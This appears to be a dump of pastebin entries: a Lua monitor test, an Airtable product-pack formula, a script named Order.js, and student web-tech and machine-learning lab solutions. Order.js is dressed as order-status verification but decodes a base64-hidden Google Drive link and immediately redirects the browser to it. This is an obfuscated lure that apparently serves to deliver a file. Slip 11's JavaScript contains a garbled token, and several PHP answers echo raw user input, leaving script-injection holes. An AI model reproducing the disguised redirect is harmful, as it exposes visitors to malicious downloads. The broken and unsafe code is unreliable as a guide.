i8s6abg7,atm10,alexnolan,Lua,Wednesday 26th of March 2025 10:41:37 AM CDT,"term.clear()
print(""Testing direct monitor connection"")

-- Try direct peripheral access
local mon = peripheral.find(""monitor"")
if mon then
  print(""Monitor found directly!"")
  mon.clear()
  mon.setCursorPos(1,1)
  mon.write(""TEST"")
else
  print(""No monitor found directly"")
end

print(""Test complete"")
"
vFCRwBvW,Untitled,kls06541,SQL,Wednesday 26th of March 2025 10:31:19 AM CDT,"IF(
  OR({Package Quantity} > 0, {Number of Items} > 0),
  MAX({Package Quantity}, {Number of Items}),
  IF(
    OR(
      REGEX_MATCH({Amazon Title}, ""(?i)\\b(\\d{1,2})[ -]?pack\\b""),
      REGEX_MATCH({Amazon Title}, ""(?i)\\b(\\d{1,2})[ -]?pk\\b""),
      REGEX_MATCH({Amazon Title}, ""(?i)pack of (\\d{1,2})\\b""),
      REGEX_MATCH({Amazon Title}, ""(?i)packs of (\\d{1,2})\\b""),
      REGEX_MATCH({Amazon Title}, ""(?i)multi[-]?pack of (\\d{1,2})\\b""),
      REGEX_MATCH({Amazon Title}, ""(?i)case of (\\d{1,2})\\b""),
      AND(
        REGEX_MATCH({Amazon Title}, ""(?i)(\\d{1,2}) piece[s]?\\b""),
        NOT(REGEX_MATCH({Amazon Title}, ""(?i)\\bset\\b""))
      ),
      REGEX_MATCH({Amazon Title}, ""\\((\\d{1,2})\\)""),
      REGEX_MATCH({Amazon Title}, ""(?i)\\b(\\d{1,2})ct\\b""),
      REGEX_MATCH({Amazon Title}, ""(?i)(\\d{1,2}) ?[xX] ?packs?\\b""),
      REGEX_MATCH({Amazon Title}, ""(?i)x (\\d{1,2}) packs?\\b""),
      REGEX_MATCH({Amazon Title}, ""(?i)total[-]?(\\d{1,2})[-]?packs?\\b"")
    ),
    VALUE(
      IF(
        REGEX_MATCH({Amazon Title}, ""(?i)\\b(\\d{1,2})[ -]?pack\\b""),
        REGEX_EXTRACT({Amazon Title}, ""(?i)\\b(\\d{1,2})[ -]?pack\\b""),
        IF(
          REGEX_MATCH({Amazon Title}, ""(?i)\\b(\\d{1,2})[ -]?pk\\b""),
          REGEX_EXTRACT({Amazon Title}, ""(?i)\\b(\\d{1,2})[ -]?pk\\b""),
          IF(
            REGEX_MATCH({Amazon Title}, ""(?i)pack of (\\d{1,2})\\b""),
            REGEX_EXTRACT({Amazon Title}, ""(?i)pack of (\\d{1,2})\\b""),
            IF(
              REGEX_MATCH({Amazon Title}, ""(?i)packs of (\\d{1,2})\\b""),
              REGEX_EXTRACT({Amazon Title}, ""(?i)packs of (\\d{1,2})\\b""),
              IF(
                REGEX_MATCH({Amazon Title}, ""(?i)multi[-]?pack of (\\d{1,2})\\b""),
                REGEX_EXTRACT({Amazon Title}, ""(?i)multi[-]?pack of (\\d{1,2})\\b""),
                IF(
                  REGEX_MATCH({Amazon Title}, ""(?i)case of (\\d{1,2})\\b""),
                  REGEX_EXTRACT({Amazon Title}, ""(?i)case of (\\d{1,2})\\b""),
                  IF(
                    AND(
                      REGEX_MATCH({Amazon Title}, ""(?i)(\\d{1,2}) piece[s]?\\b""),
                      NOT(REGEX_MATCH({Amazon Title}, ""(?i)\\bset\\b""))
                    ),
                    REGEX_EXTRACT({Amazon Title}, ""(?i)(\\d{1,2}) piece[s]?\\b""),
                    IF(
                      REGEX_MATCH({Amazon Title}, ""\\((\\d{1,2})\\)""),
                      REGEX_EXTRACT({Amazon Title}, ""\\((\\d{1,2})\\)""),
                      IF(
                        REGEX_MATCH({Amazon Title}, ""(?i)\\b(\\d{1,2})ct\\b""),
                        IF(
                          VALUE(REGEX_EXTRACT({Amazon Title}, ""(?i)\\b(\\d{1,2})ct\\b"")) > 20,
                          ""1"",
                          REGEX_EXTRACT({Amazon Title}, ""(?i)\\b(\\d{1,2})ct\\b"")
                        ),
                        IF(
                          REGEX_MATCH({Amazon Title}, ""(?i)(\\d{1,2}) ?[xX] ?packs?\\b""),
                          REGEX_EXTRACT({Amazon Title}, ""(?i)(\\d{1,2}) ?[xX] ?packs?\\b""),
                          IF(
                            REGEX_MATCH({Amazon Title}, ""(?i)x (\\d{1,2}) packs?\\b""),
                            REGEX_EXTRACT({Amazon Title}, ""(?i)x (\\d{1,2}) packs?\\b""),
                            IF(
                              REGEX_MATCH({Amazon Title}, ""(?i)total[-]?(\\d{1,2})[-]?packs?\\b""),
                              REGEX_EXTRACT({Amazon Title}, ""(?i)total[-]?(\\d{1,2})[-]?packs?\\b""),
                              ""1""
                            )
                          )
                        )
                      )
                    )
                  )
                )
              )
            )
          )
        )
      )
    ),
    1
  )
)"
vrG41kfV,Order.js,navrajkhunger,JavaScript,Wednesday 26th of March 2025 10:29:40 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/692/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
WUUFrfKM,WebTech Slip Solutions,dudehost,PHP,Wednesday 26th of March 2025 10:27:28 AM CDT,"Slip No: 1
Q.1) Write a PHP script to keep track of number of times the web page has been accessed (Use Session Tracking).
Solution:
<?php
session_start();
if (!isset($_SESSION['page_views'])) {
    $_SESSION['page_views'] = 0;
}
$_SESSION['page_views']++;
echo ""Page accessed "" . $_SESSION['page_views'] . "" times."";
?>

Q.2) Create 'Position_Salaries' Data set. Build a linear regression model by identifying independent and target variable. Split the variables into training and testing sets, then divide the training and testing sets into a 7:3 ratio, respectively and print them. Build a simple linear regression model.
Solution:
import pandas as pd
from sklearn.model_selection import train_test_split
from sklearn.linear_model import LinearRegression

data = {'Position_Level': [1, 2, 3, 4, 5, 6, 7, 8, 9, 10],
        'Salary': [45000, 50000, 60000, 80000, 110000, 150000, 200000, 300000, 500000, 1000000]}
df = pd.DataFrame(data)
X = df[['Position_Level']]
y = df['Salary']
X_train, X_test, y_train, y_test = train_test_split(X, y, test_size=0.3, random_state=42)
print(""X_train:\n"", X_train, ""\nX_test:\n"", X_test, ""\ny_train:\n"", y_train, ""\ny_test:\n"", y_test)
model = LinearRegression()
model.fit(X_train, y_train)
print(""Slope:"", model.coef_, ""Intercept:"", model.intercept_)

Slip No: 2
Q.1) Write a PHP script to change the preferences of your web page like font style, font size, font color, background color using cookie. Display selected setting on next web page and actual implementation (with new settings) on third page (Use Cookies).
Solution:
<!-- page1.php -->
<form method=""post"" action=""page2.php"">
    Font Style: <input type=""text"" name=""font_style""><br>
    Font Size: <input type=""text"" name=""font_size""><br>
    Font Color: <input type=""text"" name=""font_color""><br>
    Background Color: <input type=""text"" name=""bg_color""><br>
    <input type=""submit"" value=""Set Preferences"">
</form>

<!-- page2.php -->
<?php
if ($_SERVER[""REQUEST_METHOD""] == ""POST"") {
    setcookie(""font_style"", $_POST['font_style'], time() + 3600);
    setcookie(""font_size"", $_POST['font_size'], time() + 3600);
    setcookie(""font_color"", $_POST['font_color'], time() + 3600);
    setcookie(""bg_color"", $_POST['bg_color'], time() + 3600);
    echo ""Preferences set: "" . $_POST['font_style'] . "", "" . $_POST['font_size'] . "", "" . 
         $_POST['font_color'] . "", "" . $_POST['bg_color'];
    echo ""<br><a href='page3.php'>Go to Page 3</a>"";
}
?>

<!-- page3.php -->
<?php
echo ""<style>body { font-family: "" . $_COOKIE['font_style'] . ""; font-size: "" . 
     $_COOKIE['font_size'] . ""px; color: "" . $_COOKIE['font_color'] . ""; background-color: "" . 
     $_COOKIE['bg_color'] . ""; }</style>"";
echo ""Page with new settings!"";
?>

Q.2) Create 'Salary' Data set. Build a linear regression model by identifying independent and target variable. Split the variables into training and testing sets and print them. Build a simple linear regression model for predicting purchases.
Solution:
import pandas as pd
from sklearn.model_selection import train_test_split
from sklearn.linear_model import LinearRegression

data = {'Years_Experience': [1, 2, 3, 4, 5], 'Salary': [30000, 35000, 40000, 45000, 50000]}
df = pd.DataFrame(data)
X = df[['Years_Experience']]
y = df['Salary']
X_train, X_test, y_train, y_test = train_test_split(X, y, test_size=0.3, random_state=42)
print(""X_train:\n"", X_train, ""\nX_test:\n"", X_test, ""\ny_train:\n"", y_train, ""\ny_test:\n"", y_test)
model = LinearRegression()
model.fit(X_train, y_train)
print(""Slope:"", model.coef_, ""Intercept:"", model.intercept_)

Slip No: 3
Q.1) Write a PHP script to accept username and password. If in the first three chances, username and password entered is correct then display second form with ""Welcome message"" otherwise display error message. [Use Session]
Solution:
<?php
session_start();
if (!isset($_SESSION['attempts'])) $_SESSION['attempts'] = 0;
$correct_username = ""admin"";
$correct_password = ""12345"";

if ($_SERVER[""REQUEST_METHOD""] == ""POST"") {
    $_SESSION['attempts']++;
    if ($_POST['username'] == $correct_username && $_POST['password'] == $correct_password && $_SESSION['attempts'] <= 3) {
        echo ""<h2>Welcome, "" . $_POST['username'] . ""!</h2><form><input type='submit' value='Proceed'></form>"";
        session_destroy();
    } elseif ($_SESSION['attempts'] <= 3) {
        echo ""Incorrect. Attempt "" . $_SESSION['attempts'] . "" of 3."";
    } else {
        echo ""Error: Max attempts exceeded."";
        session_destroy();
    }
}
?>
<form method=""post"">
    Username: <input type=""text"" name=""username""><br>
    Password: <input type=""password"" name=""password""><br>
    <input type=""submit"" value=""Login"">
</form>

Q.2) Create 'User' Data set having 5 columns namely: User ID, Gender, Age, Estimated Salary and Purchased. Build a logistic regression model that can predict whether on the given parameter a person will buy a car or not.
Solution:
import pandas as pd
from sklearn.model_selection import train_test_split
from sklearn.linear_model import LogisticRegression
from sklearn.preprocessing import LabelEncoder

data = {'User ID': range(1, 11), 'Gender': ['M', 'F', 'M', 'F', 'M', 'F', 'M', 'F', 'M', 'F'],
        'Age': [19, 35, 26, 27, 19, 27, 32, 25, 35, 20], 'Estimated Salary': [19000, 20000, 43000, 57000, 76000, 58000, 84000, 150000, 33000, 65000],
        'Purchased': [0, 0, 0, 1, 1, 0, 1, 1, 0, 1]}
df = pd.DataFrame(data)
df['Gender'] = LabelEncoder().fit_transform(df['Gender'])
X = df[['Gender', 'Age', 'Estimated Salary']]
y = df['Purchased']
X_train, X_test, y_train, y_test = train_test_split(X, y, test_size=0.3, random_state=42)
model = LogisticRegression()
model.fit(X_train, y_train)
print(""Accuracy:"", model.score(X_test, y_test))

Slip No: 4
Q.1) Write a PHP script to accept Employee details (Eno, Ename, Address) on first page. On second page accept earning (Basic, DA, HRA). On third page print Employee information (Eno, Ename, Address, Basic, DA, HRA, Total) [Use Session]
Solution:
<!-- page1.php -->
<?php session_start(); ?>
<form method=""post"" action=""page2.php"">
    Eno: <input type=""text"" name=""eno""><br>
    Ename: <input type=""text"" name=""ename""><br>
    Address: <input type=""text"" name=""address""><br>
    <input type=""submit"" value=""Next"">
</form>

<!-- page2.php -->
<?php
session_start();
if ($_SERVER[""REQUEST_METHOD""] == ""POST"") {
    $_SESSION['eno'] = $_POST['eno'];
    $_SESSION['ename'] = $_POST['ename'];
    $_SESSION['address'] = $_POST['address'];
}
?>
<form method=""post"" action=""page3.php"">
    Basic: <input type=""text"" name=""basic""><br>
    DA: <input type=""text"" name=""da""><br>
    HRA: <input type=""text"" name=""hra""><br>
    <input type=""submit"" value=""Next"">
</form>

<!-- page3.php -->
<?php
session_start();
if ($_SERVER[""REQUEST_METHOD""] == ""POST"") {
    $total = $_POST['basic'] + $_POST['da'] + $_POST['hra'];
    echo ""Eno: "" . $_SESSION['eno'] . ""<br>Ename: "" . $_SESSION['ename'] . ""<br>Address: "" . 
         $_SESSION['address'] . ""<br>Basic: "" . $_POST['basic'] . ""<br>DA: "" . $_POST['da'] . 
         ""<br>HRA: "" . $_POST['hra'] . ""<br>Total: "" . $total;
    session_destroy();
}
?>

Q.2) Build a simple linear regression model for Fish Species Weight Prediction.
Solution:
import pandas as pd
from sklearn.model_selection import train_test_split
from sklearn.linear_model import LinearRegression

data = {'Length': [25, 30, 35, 40, 45], 'Weight': [200, 300, 400, 500, 600]}
df = pd.DataFrame(data)
X = df[['Length']]
y = df['Weight']
X_train, X_test, y_train, y_test = train_test_split(X, y, test_size=0.3, random_state=42)
model = LinearRegression()
model.fit(X_train, y_train)
print(""Slope:"", model.coef_, ""Intercept:"", model.intercept_)

Slip No: 5
Q.1) Create XML file named ""Item.xml"" with item-name, item-rate, item quantity Store the details of 5 Items of different Types
Solution:
<!-- Item.xml -->
<?xml version=""1.0"" encoding=""UTF-8""?>
<Items>
    <Item><item-name>Laptop</item-name><item-rate>50000</item-rate><item-quantity>10</item-quantity></Item>
    <Item><item-name>Mouse</item-name><item-rate>500</item-rate><item-quantity>50</item-quantity></Item>
    <Item><item-name>Keyboard</item-name><item-rate>1000</item-rate><item-quantity>30</item-quantity></Item>
    <Item><item-name>Monitor</item-name><item-rate>15000</item-rate><item-quantity>15</item-quantity></Item>
    <Item><item-name>Printer</item-name><item-rate>8000</item-rate><item-quantity>5</item-quantity></Item>
</Items>

Q.2) Use the iris dataset. Write a Python program to view some basic statistical details like percentile, mean, std etc. of the species of 'Iris-setosa', 'Iris-versicolor' and 'Iris-virginica'. Apply logistic regression on the dataset to identify different species (setosa, versicolor, verginica) of Iris flowers given just 4 features: sepal and petal lengths and widths.. Find the accuracy of the model.
Solution:
import pandas as pd
from sklearn.datasets import load_iris
from sklearn.model_selection import train_test_split
from sklearn.linear_model import LogisticRegression

iris = load_iris()
df = pd.DataFrame(data=iris.data, columns=iris.feature_names)
df['Species'] = iris.target
df['Species'] = df['Species'].map({0: 'Iris-setosa', 1: 'Iris-versicolor', 2: 'Iris-virginica'})
for species in df['Species'].unique():
    print(f""\n{species}:\n"", df[df['Species'] == species].describe())
X = df[iris.feature_names]
y = df['Species']
X_train, X_test, y_train, y_test = train_test_split(X, y, test_size=0.3, random_state=42)
model = LogisticRegression(max_iter=200)
model.fit(X_train, y_train)
print(""Accuracy:"", model.score(X_test, y_test))

Slip No: 6
Q.1) Write PHP script to read ""book.xml"" file into simpleXML object. Display attributes and elements. ( simple_xml_load_file() function )
Solution:
<!-- book.xml -->
<?xml version=""1.0"" encoding=""UTF-8""?>
<Books>
    <Book id=""1""><title>Python Basics</title><author>John Doe</author><price>500</price></Book>
    <Book id=""2""><title>PHP Guide</title><author>Jane Smith</author><price>600</price></Book>
</Books>

<?php
$xml = simplexml_load_file(""book.xml"");
foreach ($xml->Book as $book) {
    echo ""Book ID: "" . $book['id'] . ""<br>Title: "" . $book->title . ""<br>Author: "" . 
         $book->author . ""<br>Price: "" . $book->price . ""<br><br>"";
}
?>

Q.2) Create the following dataset in python & Convert the categorical values into numeric format. Apply the apriori algorithm on the above dataset to generate the frequent itemsets and association rules. Repeat the process with different min_sup values.
Solution:
import pandas as pd
from mlxtend.frequent_patterns import apriori, association_rules

data = {'TID': [1, 2, 3, 4, 5], 'Items': [['Bread', 'Milk'], ['Bread', 'Diaper', 'Beer', 'Eggs'], 
        ['Milk', 'Diaper', 'Beer', 'Coke'], ['Bread', 'Milk', 'Diaper', 'Beer'], ['Bread', 'Milk', 'Diaper', 'Coke']]}
df = pd.DataFrame(data)
items = set(item for sublist in df['Items'] for item in sublist)
encoded_df = pd.DataFrame({item: [1 if item in row else 0 for row in df['Items']] for item in items})
for min_sup in [0.4, 0.6]:
    frequent_itemsets = apriori(encoded_df, min_support=min_sup, use_colnames=True)
    rules = association_rules(frequent_itemsets, metric=""confidence"", min_threshold=0.7)
    print(f""\nmin_sup = {min_sup}:\nFrequent Itemsets:\n"", frequent_itemsets, ""\nRules:\n"", rules)

Slip No: 8
Q.1) Write a JavaScript to display message 'Exams are near, have you started preparing for?' (usealert box ) and Accept any two numbers from user and display addition of two number.(Use Prompt and confirm box)
Solution:
<script>
alert(""Exams are near, have you started preparing for?"");
let num1 = parseInt(prompt(""Enter first number:""));
let num2 = parseInt(prompt(""Enter second number:""));
if (confirm(""Do you want to see the sum?"")) {
    document.write(""Sum: "" + (num1 + num2));
}
</script>

Q.2) Download the groceries dataset. Write a python program to read the dataset and display its information. Preprocess the data (drop null values etc.) Convert the categorical values into numeric format. Apply the apriori algorithm on the above dataset to generate the frequent itemsets and association rules.
Solution:
import pandas as pd
from mlxtend.frequent_patterns import apriori, association_rules

df = pd.read_csv('groceries.csv')  # Replace with actual path
print(df.info())
df.dropna(inplace=True)
transactions = df['items'].str.split(',').apply(lambda x: pd.Series(1, index=x)).fillna(0)
frequent_itemsets = apriori(transactions, min_support=0.05, use_colnames=True)
rules = association_rules(frequent_itemsets, metric=""confidence"", min_threshold=0.7)
print(""Frequent Itemsets:\n"", frequent_itemsets, ""\nRules:\n"", rules)

Slip No: 9
Q.1) Write a JavaScript function to validate username and password for a membership form.
Solution:
<script>
function validateForm() {
    let username = document.getElementById(""username"").value;
    let password = document.getElementById(""password"").value;
    if (username.length < 5) {
        alert(""Username must be at least 5 characters."");
        return false;
    }
    if (password.length < 8) {
        alert(""Password must be at least 8 characters."");
        return false;
    }
    alert(""Validation successful!"");
    return true;
}
</script>
<form onsubmit=""return validateForm()"">
    Username: <input type=""text"" id=""username""><br>
    Password: <input type=""password"" id=""password""><br>
    <input type=""submit"" value=""Submit"">
</form>

Q.2) Create your own transactions dataset and apply the above process on your dataset.
Solution:
import pandas as pd
from mlxtend.frequent_patterns import apriori, association_rules

data = {'TID': [1, 2, 3, 4, 5], 'Items': [['eggs', 'milk', 'bread'], ['eggs', 'apple'], 
        ['milk', 'bread'], ['apple', 'milk'], ['milk', 'apple', 'bread']]}
df = pd.DataFrame(data)
items = set(item for sublist in df['Items'] for item in sublist)
encoded_df = pd.DataFrame({item: [1 if item in row else 0 for row in df['Items']] for item in items})
for min_sup in [0.4, 0.6]:
    frequent_itemsets = apriori(encoded_df, min_support=min_sup, use_colnames=True)
    rules = association_rules(frequent_itemsets, metric=""confidence"", min_threshold=0.7)
    print(f""\nmin_sup = {min_sup}:\nFrequent Itemsets:\n"", frequent_itemsets, ""\nRules:\n"", rules)

Slip No: 10
Q.1) Create a HTML fileto insert text before and after a Paragraph using jQuery. [Hint : Use before( ) and after( )]
Solution:
<script src=""https://code.jquery.com/jquery-3.6.0.min.js""></script>
<p id=""myPara"">This is a paragraph.</p>
<script>
$(document).ready(function() {
    $(""#myPara"").before(""<b>Before Text</b><br>"");
    $(""#myPara"").after(""<br><i>After Text</i>"");
});
</script>

Q.2) Create the following dataset in python & Convert the categorical values into numeric format. Apply the apriori algorithm on the above dataset to generate the frequent itemsets and association rules. Repeat the process with different min_sup values.
Solution:
import pandas as pd
from mlxtend.frequent_patterns import apriori, association_rules

data = {'TID': [1, 2, 3, 4, 5], 'Items': [['eggs', 'milk', 'bread'], ['eggs', 'apple'], 
        ['milk', 'bread'], ['apple', 'milk'], ['milk', 'apple', 'bread']]}
df = pd.DataFrame(data)
items = set(item for sublist in df['Items'] for item in sublist)
encoded_df = pd.DataFrame({item: [1 if item in row else 0 for row in df['Items']] for item in items})
for min_sup in [0.4, 0.6]:
    frequent_itemsets = apriori(encoded_df, min_support=min_sup, use_colnames=True)
    rules = association_rules(frequent_itemsets, metric=""confidence"", min_threshold=0.7)
    print(f""\nmin_sup = {min_sup}:\nFrequent Itemsets:\n"", frequent_itemsets, ""\nRules:\n"", rules)

Slip No: 11
Q.1) Write a Javascript program to accept name of student, change font color to red, font size to 18 if student name is present otherwise on clicking on empty text box display image which changes its size (Use onblur, onload, onmouseover, onmouseclick, onmouseup)
Solution:
<input type=""text"" id=""name"" onblur=""checkName()"">
<img id=""img"" src=""image.jpg"" style=""display:none;"">
<script>
function checkName() {
    let name = document.getElementById(""name"").value;
   ocalypticlet img = document.getElementById(""img"");
    if (name) {
        document.body.style.color = ""red"";
        document.body.style.fontSize = ""18px"";
        img.style.display = ""none"";
    } else {
        img.style.display = ""block"";
        img.onmouseover = () => img.style.width = ""200px"";
        img.onmouseup = () => img.style.width = ""100px"";
    }
}
</script>

Q.2) Create the following dataset in python & Convert the categorical values into numeric format. Apply the apriori algorithm on the above dataset to generate the frequent itemsets and associationrules. Repeat the process with different min_sup values.
Solution:
import pandas as pd
from mlxtend.frequent_patterns import apriori, association_rules

data = {'TID': [1, 2, 3, 4, 5], 'Items': [['butter', 'bread', 'milk'], ['butter', 'flour', 'milk', 'sugar'], 
        ['butter', 'eggs', 'milk', 'salt'], ['eggs'], ['butter', 'flour', 'milk', 'salt']]}
df = pd.DataFrame(data)
items = set(item for sublist in df['Items'] for item in sublist)
encoded_df = pd.DataFrame({item: [1 if item in row else 0 for row in df['Items']] for item in items})
for min_sup in [0.4, 0.6]:
    frequent_itemsets = apriori(encoded_df, min_support=min_sup, use_colnames=True)
    rules = association_rules(frequent_itemsets, metric=""confidence"", min_threshold=0.7)
    print(f""\nmin_sup = {min_sup}:\nFrequent Itemsets:\n"", frequent_itemsets, ""\nRules:\n"", rules)

Slip No: 12
Q.1) Write AJAX program to read contact.dat file and print the contents of the file in a tabular format when the user clicks on print button. Contact.dat file should contain smo, name, residence number, mobile number, Address. [Enter at least 3 record in contact.dat file]
Solution:
<button onclick=""loadData()"">Print</button>
<div id=""result""></div>
<script>
function loadData() {
    let xhr = new XMLHttpRequest();
    xhr.open(""GET"", ""contact.dat"", true);
    xhr.onreadystatechange = function() {
        if (xhr.readyState == 4 && xhr.status == 200) {
            let lines = xhr.responseText.split('\n');
            let table = ""<table border='1'><tr><th>Sno</th><th>Name</th><th>Residence</th><th>Mobile</th><th>Address</th></tr>"";
            lines.forEach(line => {
                let [sno, name, res, mob, addr] = line.split(',');
                table += `<tr><td>${sno}</td><td>${name}</td><td>${res}</td><td>${mob}</td><td>${addr}</td></tr>`;
            });
            table += ""</table>"";
            document.getElementById(""result"").innerHTML = table;
        }
    };
    xhr.send();
}
</script>
*contact.dat*: 1,John,12345,98765,Addr1\n2,Jane,54321,56789,Addr2\n3,Tom,11111,22222,Addr3

Q.2) Create 'heights-and-weights' Data set . Build a linear regression model by identifying independent and target variable. Split the variables into training and testing sets and print them. Build a simple linear regression model for predicting purchases.
Solution:
import pandas as pd
from sklearn.model_selection import train_test_split
from sklearn.linear_model import LinearRegression

data = {'Height': [150, 160, 170, 180, 190], 'Weight': [50, 60, 70, 80, 90]}
df = pd.DataFrame(data)
X = df[['Height']]
y = df['Weight']
X_train, X_test, y_train, y_test = train_test_split(X, y, test_size=0.3, random_state=42)
model = LinearRegression()
model.fit(X_train, y_train)
print(""Slope:"", model.coef_, ""Intercept:"", model.intercept_)

Slip No: 13
Q.1) Write AJAX program where the user is requested to write his or her name in a text box, and the server keeps sending back responses while the user is typing. If the user name is not entered then the message displayed will be, ""Stranger, please tell me your name!"". If the name is Rohit, Virat, Dhoni, Ashwin or Harbhajan, the server responds with ""Hello, master !"". If the name is anything else, the message will be "", I don't know you!""
Solution:
<input type=""text"" id=""name"" onkeyup=""checkName()"">
<div id=""response""></div>
<script>
function checkName() {
    let name = document.getElementById(""name"").value;
    let xhr = new XMLHttpRequest();
    xhr.open(""POST"", ""server.php"", true);
    xhr.setRequestHeader(""Content-type"", ""application/x-www-form-urlencoded"");
    xhr.onreadystatechange = function() {
        if (xhr.readyState == 4 && xhr.status == 200) {
            document.getElementById(""response"").innerHTML = xhr.responseText;
        }
    };
    xhr.send(""name="" + name);
}
</script>

<!-- server.php -->
<?php
$name = $_POST['name'];
if (empty($name)) echo ""Stranger, please tell me your name!"";
elseif (in_array($name, [""Rohit"", ""Virat"", ""Dhoni"", ""Ashwin"", ""Harbhajan""])) echo ""Hello, master!"";
else echo ""$name, I don't know you!"";
?>

Q.2) Download nursery dataset from UCI. Build a linear regression model by identifying independent and target variable. Split the variables into training and testing sets and print them. Build a simple linear regression model for predicting purchases.
Solution:
import pandas as pd
from sklearn.model_selection import train_test_split
from sklearn.linear_model import LinearRegression

df = pd.read_csv('nursery.csv')  # Replace with actual path
X = df[['some_numeric_column']]  # Adjust based on actual dataset
y = df['target_column']  # Adjust based on actual dataset
X_train, X_test, y_train, y_test = train_test_split(X, y, test_size=0.3, random_state=42)
model = LinearRegression()
model.fit(X_train, y_train)
print(""Slope:"", model.coef_, ""Intercept:"", model.intercept_)

Slip No: 14
Q.1) Create TEACHER table as follows TEACHER(tno, tname, qualification, salary). Write Ajax program to select a teachers name and print the selected teachers details
Solution:
<html>
<head>
    <script type=""text/javascript"">
    function showdet(str) {
        let XHRobj;
        if (window.XMLHttpRequest) {
            XHRobj = new XMLHttpRequest(); // For modern browsers
        } else {
            XHRobj = new ActiveXObject(""Microsoft.XMLHTTP""); // For older IE browsers
        }
        
        XHRobj.onreadystatechange = function() {
            if (XHRobj.readyState == 4 && XHRobj.status == 200) {
                document.getElementById(""myDiv"").innerHTML = XHRobj.responseText;
            }
        };
        
        XHRobj.open(""GET"", ""slip14.php?q="" + str, true);
        XHRobj.send();
    }
    </script>
</head>
<body>
    <form>
        Enter Teacher Name: <input type=""text"" name=""n1"">
        <br>
        <input type=""button"" value=""Get Info"" onclick=""showdet(document.forms[0].n1.value)"">
    </form>
    <div id=""myDiv""><b>Teacher Details will be listed here...</b></div>
</body>
</html>

<!-- teacher.php -->
<?php
$q = $_GET[""q""];

// Connect to PostgreSQL
$c = pg_connect(""host=localhost port=5432 dbname=tycs user=postgres password=ssr"");
if (!$c) {
    die(""Connection failed: "" . pg_last_error());
}

// Query to fetch teacher details
$sql = ""SELECT * FROM teacher WHERE tname = $1"";
$result = pg_query_params($c, $sql, array($q)); // Using parameterized query for safety

if (pg_num_rows($result) > 0) {
    $r = pg_fetch_assoc($result); // Fetch as associative array for readability
    echo ""TNo: "" . $r['tno'] . ""<br>"";
    echo ""Name: "" . $r['tname'] . ""<br>"";
    echo ""Qualification: "" . $r['qualification'] . ""<br>"";
    echo ""Salary: "" . $r['salary'];
} else {
    echo ""No record found for teacher: "" . htmlspecialchars($q);
}

pg_close($c);
?>

Q.2) Create the following dataset in python & Convert the categorical values into numeric format. Apply the apriori algorithm on the above dataset to generate the frequent itemsets and association rules. Repeat the process with different min_sup values.
Solution:
import pandas as pd
from mlxtend.frequent_patterns import apriori, association_rules

data = {'TID': [1, 2, 3, 4], 'Items': [['Apple', 'Mango', 'Banana'], ['Mango', 'Banana', 'Cabbage', 'Carrots'], 
        ['Mango', 'Banana', 'Carrots'], ['Mango', 'Carrots']]}
df = pd.DataFrame(data)
items = set(item for sublist in df['Items'] for item in sublist)
encoded_df = pd.DataFrame({item: [1 if item in row else 0 for row in df['Items']] for item in items})
for min_sup in [0.5, 0.75]:
    frequent_itemsets = apriori(encoded_df, min_support=min_sup, use_colnames=True)
    rules = association_rules(frequent_itemsets, metric=""confidence"", min_threshold=0.7)
    print(f""\nmin_sup = {min_sup}:\nFrequent Itemsets:\n"", frequent_itemsets, ""\nRules:\n"", rules)

Slip No: 18
Q.1) Write a Java Script Program to print Fibonacci numbers on onclick event.
Solution:
<button onclick=""printFibonacci()"">Print Fibonacci</button>
<div id=""result""></div>
<script>
function printFibonacci() {
    let n = prompt(""Enter number of terms:"");
    let a = 0, b = 1, fib = [a, b];
    for (let i = 2; i < n; i++) {
        let next = a + b;
        fib.push(next);
        a = b;
        b = next;
    }
    document.getElementById(""result"").innerHTML = fib.join("", "");
}
</script>

Q.2) Consider any text paragraph. Remove the stopwords. Tokenize the paragraph to extract words and sentences. Calculate the word frequency distribution and plot the frequencies. Plot the wordcloud of the text.
Solution:
import nltk
from nltk.corpus import stopwords
from nltk.tokenize import word_tokenize, sent_tokenize
from collections import Counter
import matplotlib.pyplot as plt
from wordcloud import WordCloud

nltk.download('punkt')
nltk.download('stopwords')
text = ""This is a sample text. It has multiple sentences. This text is for testing.""
stop_words = set(stopwords.words('english'))
words = word_tokenize(text.lower())
words = [w for w in words if w not in stop_words]
sentences = sent_tokenize(text)
freq = Counter(words)
plt.bar(freq.keys(), freq.values())
plt.show()
wordcloud = WordCloud().generate(' '.join(words))
plt.imshow(wordcloud)
plt.axis(""off"")
plt.show()

Slip No: 19
Q.1) Write a Java Script Program to validate user name and password on onSubmit event.
Solution:
<form onsubmit=""return validate()"">
    Username: <input type=""text"" id=""username""><br>
    Password: <input type=""password"" id=""password""><br>
    <input type=""submit"" value=""Submit"">
</form>
<script>
function validate() {
    let username = document.getElementById(""username"").value;
    let password = document.getElementById(""password"").value;
    if (username.length < 5 || password.length < 8) {
        alert(""Username must be 5+ chars, Password 8+ chars."");
        return false;
    }
    alert(""Success!"");
    return true;
}
</script>

Q.2) Download the movie_review.csv dataset from Kaggle by using the following link :https://www.kaggle.com/nltkdata/movie-review/version/3?select=movie review.csv to perform sentiment analysis on above dataset and create a wordcloud.
Solution:
import pandas as pd
from nltk.sentiment import SentimentIntensityAnalyzer
from wordcloud import WordCloud
import matplotlib.pyplot as plt
import nltk

nltk.download('vader_lexicon')
df = pd.read_csv('movie_review.csv')  # Replace with actual path
sia = SentimentIntensityAnalyzer()
df['sentiment'] = df['text'].apply(lambda x: sia.polarity_scores(x)['compound'])
wordcloud = WordCloud().generate(' '.join(df['text']))
